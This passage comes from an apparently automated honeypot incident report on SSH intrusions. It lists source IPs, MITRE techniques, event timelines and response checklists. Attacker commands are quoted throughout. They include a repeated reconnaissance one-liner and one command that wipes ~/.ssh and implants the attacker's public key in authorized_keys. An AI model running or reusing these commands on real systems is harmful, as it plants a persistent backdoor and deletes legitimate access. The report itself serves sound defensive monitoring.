| `2026-07-08 04:30:40` | `cowrie.command.success` |
| `2026-07-08 04:30:40` | `cowrie.command.input` |
| `2026-07-08 04:30:40` | `cowrie.command.input` |
| `2026-07-08 04:30:40` | `cowrie.command.input` |
| `2026-07-08 04:30:40` | `cowrie.command.input` |
| `2026-07-08 04:30:40` | `cowrie.log.closed` |
| `2026-07-08 04:30:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3ca360baed0

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-07-08 04:32 |
| **Last Seen** | 2026-07-08 04:32 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 04:32:13` | `cowrie.session.connect` |
| `2026-07-08 04:32:14` | `cowrie.client.version` |
| `2026-07-08 04:32:14` | `cowrie.client.kex` |
| `2026-07-08 04:32:16` | `cowrie.login.success` |
| `2026-07-08 04:32:17` | `cowrie.session.params` |
| `2026-07-08 04:32:17` | `cowrie.command.input` |
| `2026-07-08 04:32:17` | `cowrie.command.input` |
| `2026-07-08 04:32:17` | `cowrie.command.input` |
| `2026-07-08 04:32:17` | `cowrie.command.input` |
| `2026-07-08 04:32:17` | `cowrie.command.input` |
| `2026-07-08 04:32:17` | `cowrie.command.success` |
| `2026-07-08 04:32:17` | `cowrie.command.input` |
| `2026-07-08 04:32:17` | `cowrie.command.input` |
| `2026-07-08 04:32:17` | `cowrie.command.input` |
| `2026-07-08 04:32:17` | `cowrie.command.input` |
| `2026-07-08 04:32:17` | `cowrie.log.closed` |
| `2026-07-08 04:32:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2cc87c29f730

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-07-08 04:33 |
| **Last Seen** | 2026-07-08 04:33 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 04:33:39` | `cowrie.session.connect` |
| `2026-07-08 04:33:40` | `cowrie.client.version` |
| `2026-07-08 04:33:40` | `cowrie.client.kex` |
| `2026-07-08 04:33:42` | `cowrie.login.success` |
| `2026-07-08 04:33:43` | `cowrie.session.params` |
| `2026-07-08 04:33:43` | `cowrie.command.input` |
| `2026-07-08 04:33:43` | `cowrie.command.input` |
| `2026-07-08 04:33:43` | `cowrie.command.input` |
| `2026-07-08 04:33:43` | `cowrie.command.input` |
| `2026-07-08 04:33:43` | `cowrie.command.input` |
| `2026-07-08 04:33:43` | `cowrie.command.success` |
| `2026-07-08 04:33:43` | `cowrie.command.input` |
| `2026-07-08 04:33:43` | `cowrie.command.input` |
| `2026-07-08 04:33:43` | `cowrie.command.input` |
| `2026-07-08 04:33:43` | `cowrie.command.input` |
| `2026-07-08 04:33:44` | `cowrie.log.closed` |
| `2026-07-08 04:33:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5cdff32937b7

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-07-08 04:35 |
| **Last Seen** | 2026-07-08 04:35 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 04:35:06` | `cowrie.session.connect` |
| `2026-07-08 04:35:06` | `cowrie.client.version` |
| `2026-07-08 04:35:06` | `cowrie.client.kex` |
| `2026-07-08 04:35:08` | `cowrie.login.success` |
| `2026-07-08 04:35:09` | `cowrie.session.params` |
| `2026-07-08 04:35:09` | `cowrie.command.input` |
| `2026-07-08 04:35:09` | `cowrie.command.input` |
| `2026-07-08 04:35:09` | `cowrie.command.input` |
| `2026-07-08 04:35:09` | `cowrie.command.input` |
| `2026-07-08 04:35:09` | `cowrie.command.input` |
| `2026-07-08 04:35:09` | `cowrie.command.success` |
| `2026-07-08 04:35:09` | `cowrie.command.input` |
| `2026-07-08 04:35:09` | `cowrie.command.input` |
| `2026-07-08 04:35:09` | `cowrie.command.input` |
| `2026-07-08 04:35:09` | `cowrie.command.input` |
| `2026-07-08 04:35:10` | `cowrie.log.closed` |
| `2026-07-08 04:35:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1df4015439f

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-07-08 04:36 |
| **Last Seen** | 2026-07-08 04:36 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 04:36:36` | `cowrie.session.connect` |
| `2026-07-08 04:36:36` | `cowrie.client.version` |
| `2026-07-08 04:36:36` | `cowrie.client.kex` |
| `2026-07-08 04:36:38` | `cowrie.login.success` |
| `2026-07-08 04:36:39` | `cowrie.session.params` |
| `2026-07-08 04:36:39` | `cowrie.command.input` |
| `2026-07-08 04:36:39` | `cowrie.command.input` |
| `2026-07-08 04:36:39` | `cowrie.command.input` |
| `2026-07-08 04:36:39` | `cowrie.command.input` |
| `2026-07-08 04:36:39` | `cowrie.command.input` |
| `2026-07-08 04:36:39` | `cowrie.command.success` |
| `2026-07-08 04:36:39` | `cowrie.command.input` |
| `2026-07-08 04:36:39` | `cowrie.command.input` |
| `2026-07-08 04:36:39` | `cowrie.command.input` |
| `2026-07-08 04:36:39` | `cowrie.command.input` |
| `2026-07-08 04:36:39` | `cowrie.log.closed` |
| `2026-07-08 04:36:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-829694b100b4

| Field | Detail |
|---|---|
| **Source IP** | `72.14.178[.]148` |
| **First Seen** | 2026-07-08 04:37 |
| **Last Seen** | 2026-07-08 04:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `Accept: */*, Accept-Encoding: gzip, User-Agent: Mozilla/5.0 zgrab/0.x` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 04:37:05` | `cowrie.session.connect` |
| `2026-07-08 04:37:05` | `cowrie.login.success` |
| `2026-07-08 04:37:06` | `cowrie.session.params` |
| `2026-07-08 04:37:06` | `cowrie.command.input` |
| `2026-07-08 04:37:06` | `cowrie.command.failed` |
| `2026-07-08 04:37:06` | `cowrie.command.input` |
| `2026-07-08 04:37:06` | `cowrie.command.failed` |
| `2026-07-08 04:37:06` | `cowrie.command.input` |
| `2026-07-08 04:37:06` | `cowrie.command.failed` |
| `2026-07-08 04:37:06` | `cowrie.command.input` |
| `2026-07-08 04:37:07` | `cowrie.log.closed` |
| `2026-07-08 04:37:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `72.14.178[.]148` to AbuseIPDB if not already reported
- [ ] Block `72.14.178[.]148` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c97caaa9a10

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-07-08 04:38 |
| **Last Seen** | 2026-07-08 04:38 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 04:38:07` | `cowrie.session.connect` |
| `2026-07-08 04:38:08` | `cowrie.client.version` |
| `2026-07-08 04:38:08` | `cowrie.client.kex` |
| `2026-07-08 04:38:09` | `cowrie.login.success` |
| `2026-07-08 04:38:10` | `cowrie.session.params` |
| `2026-07-08 04:38:10` | `cowrie.command.input` |
| `2026-07-08 04:38:10` | `cowrie.command.input` |
| `2026-07-08 04:38:10` | `cowrie.command.input` |
| `2026-07-08 04:38:10` | `cowrie.command.input` |
| `2026-07-08 04:38:10` | `cowrie.command.input` |
| `2026-07-08 04:38:10` | `cowrie.command.success` |
| `2026-07-08 04:38:10` | `cowrie.command.input` |
| `2026-07-08 04:38:10` | `cowrie.command.input` |
| `2026-07-08 04:38:10` | `cowrie.command.input` |
| `2026-07-08 04:38:10` | `cowrie.command.input` |
| `2026-07-08 04:38:10` | `cowrie.log.closed` |
| `2026-07-08 04:38:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a3906a86714

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-07-08 04:39 |
| **Last Seen** | 2026-07-08 04:39 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 04:39:42` | `cowrie.session.connect` |
| `2026-07-08 04:39:42` | `cowrie.client.version` |
| `2026-07-08 04:39:42` | `cowrie.client.kex` |
| `2026-07-08 04:39:43` | `cowrie.login.success` |
| `2026-07-08 04:39:44` | `cowrie.session.params` |
| `2026-07-08 04:39:44` | `cowrie.command.input` |
| `2026-07-08 04:39:44` | `cowrie.command.input` |
| `2026-07-08 04:39:44` | `cowrie.command.input` |
| `2026-07-08 04:39:44` | `cowrie.command.input` |
| `2026-07-08 04:39:44` | `cowrie.command.input` |
| `2026-07-08 04:39:44` | `cowrie.command.success` |
| `2026-07-08 04:39:44` | `cowrie.command.input` |
| `2026-07-08 04:39:44` | `cowrie.command.input` |
| `2026-07-08 04:39:44` | `cowrie.command.input` |
| `2026-07-08 04:39:44` | `cowrie.command.input` |
| `2026-07-08 04:39:45` | `cowrie.log.closed` |
| `2026-07-08 04:39:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20a2d5fd0a41

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-07-08 04:41 |
| **Last Seen** | 2026-07-08 04:41 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 04:41:21` | `cowrie.session.connect` |
| `2026-07-08 04:41:21` | `cowrie.client.version` |
| `2026-07-08 04:41:21` | `cowrie.client.kex` |
| `2026-07-08 04:41:22` | `cowrie.login.success` |
| `2026-07-08 04:41:23` | `cowrie.session.params` |
| `2026-07-08 04:41:23` | `cowrie.command.input` |
| `2026-07-08 04:41:23` | `cowrie.command.input` |
| `2026-07-08 04:41:23` | `cowrie.command.input` |
| `2026-07-08 04:41:23` | `cowrie.command.input` |
| `2026-07-08 04:41:23` | `cowrie.command.input` |
| `2026-07-08 04:41:23` | `cowrie.command.success` |
| `2026-07-08 04:41:23` | `cowrie.command.input` |
| `2026-07-08 04:41:23` | `cowrie.command.input` |
| `2026-07-08 04:41:23` | `cowrie.command.input` |
| `2026-07-08 04:41:23` | `cowrie.command.input` |
| `2026-07-08 04:41:23` | `cowrie.log.closed` |
| `2026-07-08 04:41:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46edcbb15951

| Field | Detail |
|---|---|
| **Source IP** | `117.71.53[.]210` |
| **First Seen** | 2026-07-08 04:41 |
| **Last Seen** | 2026-07-08 04:41 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 04:41:44` | `cowrie.session.connect` |
| `2026-07-08 04:41:45` | `cowrie.client.version` |
| `2026-07-08 04:41:45` | `cowrie.client.kex` |
| `2026-07-08 04:41:48` | `cowrie.login.success` |
| `2026-07-08 04:41:49` | `cowrie.direct-tcpip.request` |
| `2026-07-08 04:41:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.71.53[.]210` to AbuseIPDB if not already reported
- [ ] Block `117.71.53[.]210` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a553008497d

| Field | Detail |
|---|---|
| **Source IP** | `14.39.99[.]2` |
| **First Seen** | 2026-07-08 04:41 |
| **Last Seen** | 2026-07-08 04:42 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 04:41:54` | `cowrie.session.connect` |
| `2026-07-08 04:41:55` | `cowrie.client.version` |
| `2026-07-08 04:41:55` | `cowrie.client.kex` |
| `2026-07-08 04:41:58` | `cowrie.login.success` |
| `2026-07-08 04:41:58` | `cowrie.direct-tcpip.request` |
| `2026-07-08 04:42:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.39.99[.]2` to AbuseIPDB if not already reported
- [ ] Block `14.39.99[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3885e7dc3e8b

| Field | Detail |
|---|---|
| **Source IP** | `188.36.7[.]196` |
| **First Seen** | 2026-07-08 04:42 |
| **Last Seen** | 2026-07-08 04:42 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 04:42:10` | `cowrie.session.connect` |
| `2026-07-08 04:42:11` | `cowrie.client.version` |
| `2026-07-08 04:42:11` | `cowrie.client.kex` |
| `2026-07-08 04:42:13` | `cowrie.login.success` |
| `2026-07-08 04:42:13` | `cowrie.direct-tcpip.request` |
| `2026-07-08 04:42:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `188.36.7[.]196` to AbuseIPDB if not already reported
- [ ] Block `188.36.7[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff61ee19ea28

| Field | Detail |
|---|---|
| **Source IP** | `164.92.96[.]91` |
| **First Seen** | 2026-07-08 04:42 |
| **Last Seen** | 2026-07-08 04:42 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 04:42:18` | `cowrie.session.connect` |
| `2026-07-08 04:42:18` | `cowrie.client.version` |
| `2026-07-08 04:42:18` | `cowrie.client.kex` |
| `2026-07-08 04:42:18` | `cowrie.login.success` |
| `2026-07-08 04:42:18` | `cowrie.session.params` |
| `2026-07-08 04:42:18` | `cowrie.command.input` |
| `2026-07-08 04:42:18` | `cowrie.command.failed` |
| `2026-07-08 04:42:19` | `cowrie.log.closed` |
| `2026-07-08 04:42:19` | `cowrie.session.params` |
| `2026-07-08 04:42:19` | `cowrie.command.input` |
| `2026-07-08 04:42:19` | `cowrie.session.file_download` |
| `2026-07-08 04:42:19` | `cowrie.log.closed` |
| `2026-07-08 04:42:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `164.92.96[.]91` to AbuseIPDB if not already reported
- [ ] Block `164.92.96[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71464153b6cc

| Field | Detail |
|---|---|
| **Source IP** | `111.70.23[.]240` |
| **First Seen** | 2026-07-08 04:42 |
| **Last Seen** | 2026-07-08 04:42 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 04:42:18` | `cowrie.session.connect` |
| `2026-07-08 04:42:19` | `cowrie.client.version` |
| `2026-07-08 04:42:19` | `cowrie.client.kex` |
| `2026-07-08 04:42:21` | `cowrie.login.success` |
| `2026-07-08 04:42:22` | `cowrie.direct-tcpip.request` |
| `2026-07-08 04:42:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.23[.]240` to AbuseIPDB if not already reported
- [ ] Block `111.70.23[.]240` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d66bf306d97c

| Field | Detail |
|---|---|
| **Source IP** | `164.92.96[.]91` |
| **First Seen** | 2026-07-08 04:42 |
| **Last Seen** | 2026-07-08 04:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 04:42:19` | `cowrie.session.connect` |
| `2026-07-08 04:42:19` | `cowrie.client.version` |
| `2026-07-08 04:42:20` | `cowrie.client.kex` |
| `2026-07-08 04:42:20` | `cowrie.login.success` |
| `2026-07-08 04:42:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `164.92.96[.]91` to AbuseIPDB if not already reported
- [ ] Block `164.92.96[.]91` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-710c535f1c5f

| Field | Detail |
|---|---|
| **Source IP** | `164.92.96[.]91` |
| **First Seen** | 2026-07-08 04:42 |
| **Last Seen** | 2026-07-08 04:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 04:42:20` | `cowrie.session.connect` |
| `2026-07-08 04:42:20` | `cowrie.client.version` |
| `2026-07-08 04:42:20` | `cowrie.client.kex` |
| `2026-07-08 04:42:20` | `cowrie.login.success` |
| `2026-07-08 04:42:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `164.92.96[.]91` to AbuseIPDB if not already reported
- [ ] Block `164.92.96[.]91` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78349f553829

| Field | Detail |
|---|---|
| **Source IP** | `117.69.255[.]239` |
| **First Seen** | 2026-07-08 04:42 |
| **Last Seen** | 2026-07-08 04:43 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 04:42:53` | `cowrie.session.connect` |
| `2026-07-08 04:42:54` | `cowrie.client.version` |
| `2026-07-08 04:42:54` | `cowrie.client.kex` |
| `2026-07-08 04:42:56` | `cowrie.login.success` |
| `2026-07-08 04:42:57` | `cowrie.direct-tcpip.request` |
| `2026-07-08 04:43:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.69.255[.]239` to AbuseIPDB if not already reported
- [ ] Block `117.69.255[.]239` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ef15cf5e6eb

| Field | Detail |
|---|---|
| **Source IP** | `179.185.1[.]97` |
| **First Seen** | 2026-07-08 04:43 |
| **Last Seen** | 2026-07-08 04:43 |
| **Session Duration** | 8s |
